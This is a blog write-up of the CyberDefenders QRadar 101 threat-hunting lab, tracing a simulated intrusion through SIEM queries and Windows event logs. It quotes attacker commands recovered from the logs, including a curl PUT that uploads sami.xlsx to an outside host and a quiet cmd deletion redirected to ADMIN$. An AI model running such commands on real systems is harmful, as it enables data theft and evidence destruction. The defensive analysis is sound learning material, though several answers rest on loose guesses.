---
title: CyberDefenders QRadar 101
description: A comprehensive writeup of the QRadar 101 challenge from CyberDefenders, covering SIEM fundamentals and log analysis techniques.
date: 2025-10-05
tags:
  - Threat Hunting
  - SIEM
  - Log Analysis
  - Incident Response
  - Threat Intelligence
  - CyberDefenders
featured: false
draft: false
---

![QRadar 101 Challenge](https://miro.medium.com/v2/resize:fit:322/format:webp/1*OGkjuHgXm9inBmtjczPOGA.png)

Sharing my thought process as I work through Cyberdefenders Qradar101 Threat Hunting lab. I've yet to experiment with Qradar, so this will be a learning experience for me.

**Lab Link**: https://cyberdefenders.org/blueteam-ctf-challenges/qradar101/  
**Category**: Threat Hunting  
**Tactics**: Execution, Persistence, Privilege Escalation, Defense Evasion, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration

## Scenario Overview

A financial company was compromised, and they are looking for a security analyst to help them investigate the incident. The company suspects that an insider helped the attacker get into the network, but they have no evidence.

The initial analysis performed by the company's team showed that many systems were compromised. Also, alerts indicate the use of well known malicious tools in the network. As a SOC analyst, you are assigned to investigate the incident using QRadar SIEM and reconstruct the events carried out by the attacker.

## Threat Hunting Questions

**Q1: How many log sources are available?**

Navigating to the admin console, under Data Sources I obtained a list of all log sources:

![QRadar Log Sources](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7FOPJ3U0mLU0s2XngCzpxQ.png)

![QRadar Log Sources Continued](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R8xVkJ6zf2cJ7tOqMgWxiQ.png)

**Q2: What is the IDS software used to monitor the network?**

Within log sources module, the IDS software of Suricata is listed.

**Q3: What is the domain name used in the network?**

Researching the query language for Qradar, I was able to understand that Qradar utilizes [AQL](https://www.ibm.com/docs/en/qsip/7.5?topic=aql-ariel-query-language), which seemed similar to SQL to me.

Since we are searching for the domain name, this information should be present in logins, so I ran a query to display all successful logins within the date range of 9/4/2020 through 9/4/2025 since the specific date range of the attack was not specified.

```sql
SELECT * FROM events WHERE "eventId" = 4624
```

The query returned 1,531 results of successful logins all occurring on October 29th, 2020.

![Successful Logins Query Results](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SrcQ9r8Idxv_-tE7-9bblQ.png)

Analyzing the first present log, I was able to inspect the payload information, in which the account domain of "**HACKDEFEND.local**" was present.

![Domain Information in Log](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Of_Twq2wOtbz6oiQpSOAjg.png)

**Q4: Multiple IPs were communicating with the malicious server. One of them ends with "20". Provide the full IP.**

Ironically, I noticed the first IP that was given in my successful logon query ended in .20, which solved my answer.

**Q5: What is the SID of the most frequent alert rule in the dataset?**

As im still getting familiar with Qradar, I was unsure on how to group by a column, after doing some research, I was able to find the SID of the most frequent alert by Log Activity > Search > Edit Search > Column or Select From List.

![QRadar Search Interface](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GOGBgcpr6GAE1AIkcopuqA.png)

![SID Column Filter](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WjXIul8vJGgudxKH0r93kg.png)

By filtering on SID column, the search returns a pie chart explicitly giving me the amount of alerts with the SID associated.

The most frequent PID was associated with DNS queries to .cloud domains, flagging them as potentially bad traffic.

**Q6: What is the attacker's IP address?**

By reviewing the Offenses tab in Qradar, we can identify a specific offense related to excessive firewall denies between hosts. This offense tells us the source IP address that is causing these excessive firewall denies resulting in this offense.

![QRadar Offenses Tab](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BInaprwpRvaZc8T89l8lEQ.png)

**Q7: The attacker was searching for data belonging to one of the company's projects, can you find the name of the project?**

To find the name of the project that the attacker was searching for, I tried filtering by the attackers IP address, but unfortunately did not find much besides connection records and NIDS alerts.

I stopped filtering by the original attacker IP address of 192.20.80.25, and decided to filter on the payload. Using a specific payload contains regular expression filter on "project" .

![Project Search Filter](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zqy3EjFvht6SXMVv7D3oLw.png)

By combing through the logs, we can identify a private IP address of 192.168.10.55, suggesting the attacker has compromised an internal host belonging to that 192.168.10.55 address and gained a foothold within the network. Additionally, by going through the 4 logs in which the payload contains "project", the payload information tells us the targeted project (project48).

![Project48 Payload Information](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1WAfbI3hjbI-TOq4XylX4g.png)

**Q9: What is the username of the infected employee using 192.168.10.15?**

From the payload information and log information pertaining to the source IP, we identified the compromised host IP address of 192.168.10.15, filtering logs between May 1st, 2020, and December 30th, 2025, on the compromised host IP address and event ID 4624 for a successful logon. Through the logs, we are able to identify the compromised user "nour".

![Compromised User Nour](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HLj5UsCfvivrcXgpiz_22A.png)

**Q10:** **Hackers do not like logging, what logging was the attacker checking to see if enabled?**

To try and find this information, I originally tried filtering on the username "nour" and event IDs 4719 and 1102. Unfortunately, this returned unsuccessful, so I tried a different approach of filtering on events of process creation (4688). This also was unsucessful. Instead, I focused on any logs related to the username "nour". Looking at the first chronological logs related to nour, I found several logon/offs, and a powershell console started.

![PowerShell Console Activity](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Dne3FSxQz3-LHgTZ7cYoIQ.png)

Following the powershell console, a ton of module logging command invocation came after, outlining the attackers use of PowerShell to possibly get more information about the environment.

**Q11: Name of the second system the attacker targeted to cover up the employee?**

To find information on this, we know the attacker is using PowerShell cmdlets to gain information on the environment. To find information on the second system the attacker targeted to cover up the employee, we can filter on "Process CommandLine" containing "del". 4 logs return, and combing through these logs, we can find a suspicious cmd command.

```cmd
cmd.exe /Q /c del sami.xlsx 1> \\127.0.0.1\ADMIN$\__1604917981.0572538 2>&1
```

![Suspicious Command](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o2PPGn2xvt7Kv3SiYQxg_Q.png)

Examining the command that run, /Q turns on quiet mode, and /c is used to delete the file "sami.xlsx", which could be deleting important files maybe related to project48 or possibly evidence of some sort. The output is then redirected to localhost/ADMIN$ which requires elevated permission to succesfully run, which indicates the attacker has gained elevated permissions.

**Q12: When was the first malicious connection to the domain controller (log start time — hh:mm:ss)?**

Examining the first connections made to the DC we can filter on events of "Network Connection Detected".

![Network Connection to Domain Controller](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BrudpPEQ8j15siGfH5RW1g.png)

**Q13: What is the md5 hash of the malicious file?**

By filtering on "hash", we can find in the payload information 'important_instructions.docx' along with the MD5 hash.

**Q14: What is the MITRE persistence technique ID used by the attacker?**

Considering attack techniques used by the attacker, we can look at different persistence techniques in the MITRE database.

**Q15: What protocol is used to perform host discovery?**

Considering tools like nmap are commonly used for host discovery, in which nmap uses ICMP "pings" to identify is hosts are available.

**Q16: What is the email service used by the company?(one word)**

I tried filtering logs by source ports relating to any common email ports, any of [25 or 143 or 993 or 110 or 995 or 587 or 465], but unfortunately this was unsuccessful. After reviewing [https://viewdns.info](https://viewdns.info/), we discover most IPs are owned by Microsoft, so Office365 was suitable.

**Q17: What is the name of the malicious file used for the initial infection?**

Referring to the previous question about the MD5 hash, the file name is included in the payload information.

**Q18: What is the name of the new account added by the attacker?**

To find information on account creations, we can filter on Event ID 4720, which signifies the creation of user accounts. Filtering on this in Qradar, 1 log is returned, in which the new account was created by an Administrator. Reviewing the payload information, we can find the username of the new account.

![Account Creation Event](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zi7ydUDt_Pn3KzcLx9UvKg.png)

![New Account Details](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1qXkobxZwV4QaCyyHPjJuA.png)

**Q19: What is the PID of the process that performed injection?**

By filtering on our infected host (192.168.10.15), and on Process Creation events, this returns 48 events. By going through the logs, we can see in the payload information the compromised user "nour" runs a suspicious file from the path "C:\Users\nour.HACKDEFEND\FSETPBEUsIek.exe" responsible for the injection. PID located in the payload information.

**Q20: What is the name of the tool used for lateral movement?**

I struggled with identifying the answer for this, but from what I've researched, the cmd process that was ran earlier that showed us the attacker had gained elevated permissions by writing to >ADMIN$, this is a common template used by wmiexec. According to Nischal Khadgi,
"wmiexec allows a threat actor to execute commands on a remote system and/or establish a semi-interactive shell on a remote host. A detailed analysis along with the hunting guide is provided below".

According to [Hunting for Impacket](https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy), wmiexec allows a threat actor to execute commands on a remote system and/or establish a semi-interactive shell on a remote host.

![WMIExec Command Example](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o2PPGn2xvt7Kv3SiYQxg_Q.png)

**Q21: Attacker exfiltrated one file, what is the name of the tool used for exfiltration?**

Knowing common ways for attackers to exfiltrate files may be through the use of curl, wget, or python servers, we can filter on these to see if any process creations are logged related to these events.

![Curl Exfiltration Activity](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*okPEuEnbCUKngnrqe7XU_A.png)

Query returns 1 event, and reviewing the command line process, we can see the use of curl to upload the file.

```cmd
cmd.exe /Q /c curl -X PUT --upload-file sami.xlsx http://192.20.80.25:8000 1> \\127.0.0.1\ADMIN$\__1604917392.4554174 2>&1
```

Noticing the sami.xlsx, considering the curl -X PUT, assuming 192.20.80.25:8000 accepts PUT requests, the file would be uploaded there, and earlier in the scenario, we noticed sami.xlsx being deleted.

**Q22: Who is the other legitimate domain admin other than the administrator?**

We can find this by filtering on event id 4672, which is when an administrator-level account logs on.

![Administrator Logon Events](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8VuMOsOUdyPj7CZJtcBxwA.png)

**Q23: The attacker used the host discovery technique to know how many hosts available in a certain network, what is the network the hacker scanned from the host IP 1 to 30?**

To find information on the network the threat actor scanned from the host IP 1 to 30, we can filter on port 8 for ICMP requests, and reviewing the destination IPs. Based off the logs, we can conclude from the second compromised host at 192.168.10.15, the threat actor is scanning the destination IP range from 192.168.20.X

![ICMP Host Discovery Scan](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6wiZeyuvow53KyX1dfIE8g.png)

**Q24: What is the name of the employee who hired the attacker?**

Going back to the suspicious .xlsx file that was exfiltrated, although we do not know the contents, we do know the file name was "sami.xlsx", which was uploaded through wmiexec.py. We can infer that sami is a name, and potentially the file came from an employee named sami, which was confirmed by the answer.

## Overview

From what I observed, the attacker gained initial access through a malicious document (important_instructions.docx), which executed a payload (FSETPBEUsIek.exe) on the host 192.168.10.55 under the user "nour". Using PowerShell and wmiexec.py, the attacker escalated privileges, created a new account, and moved laterally to another host (192.168.10.15). They performed host discovery using ICMP scans (possibly through the use of nmap), searched for sensitive project data related to "project48", and ultimately exfiltrated the file _sami.xlsx_ to their external server on 192.20.80.25:8000 using curl. Finally, they attempted to cover their tracks by deleting evidence and checking logging configurations. The threat actor demonstrated thorough persistence techniques, privilege escalation, lateral movement, and data exfiltration.

## Key Takeaways

- QRadar provides powerful log analysis capabilities for incident response
- Understanding AQL (Ariel Query Language) is essential for effective SIEM analysis
- Event correlation helps identify complex attack chains
- Proper log parsing and filtering is crucial for threat hunting
- Attackers often use common tools like PowerShell, wmiexec, and curl for lateral movement and exfiltration

## References

- [CyberDefenders QRadar 101 Challenge](https://cyberdefenders.org/blueteam-ctf-challenges/qradar101/)
- [IBM QRadar AQL Documentation](https://www.ibm.com/docs/en/qsip/7.5?topic=aql-ariel-query-language)
- [Hunting for Impacket - WMIExec Analysis](https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy)